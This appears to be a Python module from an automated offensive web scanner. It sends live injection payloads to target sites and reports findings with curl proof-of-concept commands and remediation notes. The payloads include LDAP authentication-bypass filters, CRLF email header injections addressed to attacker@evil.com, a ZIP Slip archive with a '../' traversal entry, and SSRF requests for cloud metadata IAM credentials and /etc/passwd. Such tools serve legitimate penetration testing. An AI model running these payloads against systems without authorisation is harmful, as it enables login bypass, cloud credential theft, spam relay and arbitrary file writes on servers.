"""
TheMasterRecon AI — Extended Injection Attack Vectors
LDAP injection, SMTP header injection, HTTP method override,
ZIP slip, API version bypass, SSRF via PDF/image generators.
"""
import re, logging, urllib.parse, time
from typing import List

log = logging.getLogger("elite.injection_extras")

# Import shared helpers from scanner context
try:
    from scanner import _get, _req, F, _jitter_sleep
except ImportError:
    def _get(url, **kw): return None
    def _req(url, **kw): return None
    def F(bug, sev, url, title, **kw): return {"bug":bug,"severity":sev,"url":url,"title":title,**kw}
    def _jitter_sleep(a,b): pass


def check_ldap_injection(targets: List[str], endpoints: List[str]) -> List[dict]:
    """LDAP injection — auth bypass via )(uid=*))( payloads."""
    findings = []
    LDAP_PAYLOADS = [
        "*)(uid=*))(|(uid=*",
        "*(|(objectClass=*))",
        "admin)(&(password=*)",
        ")(|(password=*))",
        "*)(|(objectClass=user",
        "\\2a)(uid=*))(|(uid=\\2a",
    ]
    LOGIN_PARAMS = ["username","user","login","email","uid","name","account"]
    PASSWORD_PARAMS = ["password","pass","pwd","passwd","secret"]

    # Only test endpoints that look like login/auth
    auth_eps = [e for e in endpoints if any(p in e.lower() for p in
        ["login","auth","signin","ldap","account","user","sso"])][:20]

    for ep in auth_eps:
        base = ep.split("?")[0]
        for payload in LDAP_PAYLOADS[:3]:
            for param in LOGIN_PARAMS[:3]:
                test_url = f"{base}?{param}={urllib.parse.quote(payload)}&password=test"
                try:
                    r = _get(test_url, timeout=8)
                    if not r: continue
                    status, hdrs, body = r
                    # LDAP success indicators
                    if any(s in body.lower() for s in
                        ["welcome","dashboard","logged in","success","token",
                         "session","authenticated"]) and status in [200, 302]:
                        findings.append(F("sqli","critical", test_url,
                            f"LDAP Injection — auth bypass via {param} parameter",
                            payload=payload, param=param,
                            poc=f"curl -X POST '{base}' -d '{param}={urllib.parse.quote(payload)}&password=any'",
                            impact="Full authentication bypass — login as any user without credentials",
                            remediation="Use parameterized LDAP queries. Escape special chars: ( ) * \\ NUL. Never concatenate user input into LDAP filters.",
                            confidence=90))
                        break
                except Exception:
                    pass
    return findings


def check_email_injection(targets: List[str]) -> List[dict]:
    """SMTP/Email header injection via contact forms."""
    findings = []
    INJECT_PAYLOADS = [
        "\r\nCc: attacker@evil.com",
        "\r\nBcc: attacker@evil.com",
        "\r\nTo: attacker@evil.com",
        "%0ACc:attacker@evil.com",
        "%0D%0ABcc:attacker@evil.com",
        "\nCC:attacker@evil.com\nSubject:injected",
    ]
    CONTACT_PATHS = ["/contact","/contact-us","/feedback","/support",
                     "/help","/report","/mail","/email","/send","/message"]
    EMAIL_PARAMS = ["email","from","reply_to","replyto","cc","to","name"]

    for base in targets[:20]:
        for path in CONTACT_PATHS:
            url = base.rstrip("/") + path
            r = _get(url, timeout=6)
            if not r or r[0] not in [200,301,302]: continue
            body = r[2]
            # Has a form with email-like inputs?
            if not re.search(r'type=["\']email["\']|name=["\']email', body, re.I):
                continue
            for payload in INJECT_PAYLOADS[:3]:
                for param in EMAIL_PARAMS[:3]:
                    try:
                        test_url = f"{url}?{param}={urllib.parse.quote('test@test.com'+payload)}&message=test"
                        r2 = _req(test_url, method="POST",
                                  data=f"{param}=test%40test.com{urllib.parse.quote(payload)}&message=test&subject=test",
                                  timeout=8)
                        if not r2: continue
                        st, hd, bd = r2
                        if st in [200,201] and any(s in bd.lower() for s in
                            ["sent","success","thank","received","message"]):
                            findings.append(F("misconfig","high", url,
                                f"Email Header Injection via {param} parameter",
                                payload=payload, param=param,
                                poc=f"curl -X POST '{url}' -d '{param}=victim@test.com{payload}&message=test'",
                                impact="Spam relay from trusted domain. Send phishing emails from victim's mail server. Bypass spam filters.",
                                remediation="Validate email fields strictly (RFC 5321). Strip/reject \\r\\n in all user inputs. Use email libraries that handle encoding.",
                                confidence=80))
                            break
                    except Exception:
                        pass
    return findings


def check_http_method_override(targets: List[str], endpoints: List[str]) -> List[dict]:
    """HTTP Method Override via X-HTTP-Method-Override header."""
    findings = []
    OVERRIDE_HEADERS = [
        "X-HTTP-Method-Override",
        "X-Method-Override",
        "X-HTTP-Method",
        "_method",
    ]
    DANGEROUS_METHODS = ["DELETE","PUT","PATCH","OPTIONS"]
    # Test admin/API endpoints
    test_eps = [e for e in endpoints if any(p in e.lower() for p in
        ["api","admin","delete","user","account","update","remove"])][:20]

    for ep in test_eps:
        for method in DANGEROUS_METHODS[:2]:
            for hdr in OVERRIDE_HEADERS[:2]:
                try:
                    r = _req(ep, method="POST",
                             headers={hdr: method, "Content-Type":"application/json"},
                             data="{}",timeout=8)
                    if not r: continue
                    st, hd, bd = r
                    if st in [200,202,204]:
                        # Check if it's different from normal POST
                        r2 = _req(ep, method="POST",
                                  headers={"Content-Type":"application/json"},
                                  data="{}",timeout=6)
                        if r2 and r2[0] != st:
                            findings.append(F("misconfig","high", ep,
                                f"HTTP Method Override — {method} via {hdr}",
                                override_method=method, override_header=hdr,
                                poc=f"curl -X POST '{ep}' -H '{hdr}: {method}' -d '{{}}'",
                                impact=f"Bypass firewall rules blocking {method}. Execute dangerous operations disguised as POST.",
                                remediation="Validate HTTP method at application level, not just firewall. Disable method override or allowlist specific overrides.",
                                confidence=85))
                except Exception:
                    pass
    return findings


def check_zip_slip(targets: List[str], endpoints: List[str]) -> List[dict]:
    """ZIP Slip — path traversal via malicious ZIP archive."""
    findings = []
    UPLOAD_EPS = [e for e in endpoints if any(p in e.lower() for p in
        ["upload","import","extract","zip","archive","backup","file"])][:10]

    for ep in UPLOAD_EPS:
        # Build a tiny ZIP with path traversal filename
        try:
            import io, zipfile
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, 'w') as zf:
                # Malicious path traversal entry
                zi = zipfile.ZipInfo("../../../tmp/tmr_zipslip_test.txt")
                zf.writestr(zi, "TheMasterRecon ZIP Slip Test")
            zip_bytes = buf.getvalue()

            r = _req(ep, method="POST",
                     files={"file": ("evil.zip", zip_bytes, "application/zip")},
                     timeout=10)
            if not r: continue
            st, hd, bd = r
            if st in [200,201,202]:
                # Check if file was extracted (look for path in response)
                if any(s in bd for s in ["extracted","unzip","archive","success"]):
                    # Try to verify extraction
                    verify_url = ep.split("/upload")[0] + "/tmp/tmr_zipslip_test.txt"
                    vr = _get(verify_url, timeout=5)
                    if vr and vr[0] == 200 and "ZIP Slip" in vr[2]:
                        findings.append(F("fileupload","critical", ep,
                            "ZIP Slip — path traversal via malicious archive",
                            poc=f"python3 -c \"import io,zipfile; b=io.BytesIO(); z=zipfile.ZipFile(b,'w'); z.writestr(zipfile.ZipInfo('../../../tmp/pwned.txt'),'hacked'); z.close(); open('evil.zip','wb').write(b.getvalue())\" && curl -F 'file=@evil.zip' '{ep}'",
                            impact="Write arbitrary files to server filesystem. Overwrite configs, SSH keys, cron jobs. Potential RCE.",
                            remediation="Validate ZIP entry paths before extraction. Reject entries with ../ or absolute paths. Use safe extraction libraries.",
                            confidence=95))
        except Exception:
            pass
    return findings


def check_api_version_bypass(targets: List[str], endpoints: List[str]) -> List[dict]:
    """API version bypass — v1 accessible without auth when v2 requires it."""
    findings = []
    import re as _re

    # Find versioned endpoints
    versioned = {}
    for ep in endpoints:
        m = _re.search(r'/(v\d+|api/v\d+|version/\d+)/', ep, _re.I)
        if m:
            ver = m.group(1)
            path_after = ep[m.end():]
            key = path_after.split("?")[0]
            if key not in versioned:
                versioned[key] = []
            versioned[key].append((ver, ep))

    for path, versions in list(versioned.items())[:20]:
        if len(versions) < 1: continue
        base_ep = versions[0][1]
        # Try older API versions
        for old_ver in ["v1","v0","v2","api/v1","1","beta"]:
            test_url = _re.sub(r'/(v\d+|api/v\d+)/', f"/{old_ver}/", base_ep, 1)
            if test_url == base_ep: continue
            try:
                r = _get(test_url, timeout=8)
                if not r: continue
                st, hd, bd = r
                if st == 200 and len(bd) > 50:
                    # Check original with auth header removed
                    r2 = _get(base_ep, timeout=6)
                    if r2 and r2[0] in [401, 403]:
                        findings.append(F("idor","high", test_url,
                            f"API Version Bypass — {old_ver} accessible without auth",
                            old_version=old_ver, current_ep=base_ep,
                            poc=f"# v2 requires auth (401/403):\ncurl '{base_ep}'\n# v1 accessible without auth:\ncurl '{test_url}'",
                            impact="Access protected API endpoints via older unprotected version. Exfiltrate data, bypass authorization.",
                            remediation="Apply authentication/authorization consistently across ALL API versions. Deprecate old versions or gate them equally.",
                            confidence=90))
                        break
            except Exception:
                pass
    return findings


def check_ssrf_via_pdf_gen(targets: List[str], endpoints: List[str]) -> List[dict]:
    """SSRF via PDF/screenshot/render endpoints — fetch internal URLs."""
    findings = []
    PDF_PATHS = [
        "/generate-pdf","/pdf","/export/pdf","/render/pdf",
        "/screenshot","/capture","/render","/preview",
        "/export","/export/html","/print","/report/pdf",
        "/api/pdf","/api/screenshot","/api/render","/webhook",
    ]
    SSRF_URLS = [
        "http://169.254.169.254/latest/meta-data/",  # AWS IMDS
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://169.254.170.2/v2/credentials/",  # ECS
        "http://100.100.100.200/latest/meta-data/",  # Alibaba
        "file:///etc/passwd",
    ]

    for base in targets[:20]:
        for path in PDF_PATHS:
            ep = base.rstrip("/") + path
            r = _get(ep, timeout=5)
            if not r or r[0] not in [200,302,400,422]: continue
            body = r[2]
            # Looks like a render endpoint
            if not any(s in body.lower() for s in ["url","render","generate","screenshot","pdf",
                                                     "html","source","endpoint","link"]):
                continue
            for ssrf_url in SSRF_URLS[:2]:
                for param in ["url","link","source","endpoint","html","target","src","fetch"]:
                    try:
                        test_url = f"{ep}?{param}={urllib.parse.quote(ssrf_url)}"
                        r2 = _get(test_url, timeout=10)
                        if not r2: continue
                        st, hd, bd = r2
                        # AWS metadata indicators
                        if any(s in bd for s in ["ami-","instance-id","iam","security-credentials",
                                                   "local-ipv4","root:x:0","bin/bash"]):
                            sev = "critical" if "security-credentials" in bd or "iam" in bd else "high"
                            findings.append(F("ssrf", sev, test_url,
                                f"SSRF via PDF/Render endpoint — internal URL fetch",
                                ssrf_target=ssrf_url, param=param, preview=bd[:300],
                                poc=f"curl '{ep}?{param}={urllib.parse.quote(ssrf_url)}'",
                                impact="Fetch AWS metadata including IAM credentials. Access internal services. Full cloud account takeover.",
                                remediation="Validate/allowlist URLs before fetching. Block RFC 1918 and link-local ranges. Use cloud SSRF guard solutions.",
                                confidence=95))
                            break
                    except Exception:
                        pass
    return findings
